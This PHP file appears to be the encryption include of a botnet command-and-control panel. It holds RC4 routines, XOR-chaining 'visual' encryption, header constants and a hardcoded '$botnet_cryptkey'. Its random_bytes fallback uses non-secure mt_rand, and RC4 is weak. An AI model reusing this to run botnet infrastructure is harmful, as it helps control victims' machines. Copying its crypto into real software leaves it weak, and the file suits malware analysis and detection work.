<?php
function random_bytes($length, $raw_output = false) {
$data = '';
// On a UNIX system use /dev/urandom
if (is_readable('/dev/urandom')) {
    $handle = fopen('/dev/urandom', 'rb');
    if ($handle !== false) {
    $data = fread($handle, $length);
    fclose($handle);
    }
}
// Fall back to using md_rand() - not cryptographically secure, but available everywhere
while (strlen($data) < $length) {
    $data .= pack('i', mt_rand());
}
if (strlen($data) > $length) {
    $data = substr($data, 0, $length);
}
// If requested return the raw output
if ($raw_output) {
    return $data;
}
// Otherwise return the data as a hex string
return bin2hex($data);
}

function rc4Init($key) {
$hash       = array();
$box        = array();
$keyLength  = strlen($key);

for($x = 0; $x < 256; $x++) {
    $hash[$x]   = ord($key[$x % $keyLength]);
    $box[$x]    = $x;
}

for($y = $x = 0; $x < 256; $x++) {
    $y          = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp        = $box[$x];
    $box[$x]    = $box[$y];
    $box[$y]    = $tmp;
}

return $box;
}

function rc4(&$data, $key) {
$len = strlen($data);
for($z = $y = $x = 0; $x < $len; $x++) {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;

    $tmp        = $key[$z];
    $key[$z]    = $key[$y];
    $key[$y]    = $tmp;
    $data[$x]   = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
}
}

function visualEncrypt(&$data) {
$len = strlen($data);
for($i = 1; $i < $len; $i++) {
    $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}
}

function visualDecrypt(&$data) {
$len = strlen($data);
if($len > 0) {
    for($i = $len - 1; $i > 0; $i--) {
    $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
    }
}
}

define('HEADER_SIZE', 24);
define('HEADER_MD5', 8);

$botnet_cryptkey = '6dNfg8Upn5fBzGgj8licQHblQvLnUY19z5zcNKNFdsDhUzuI8otEsBODrzFCqCKr';
?>
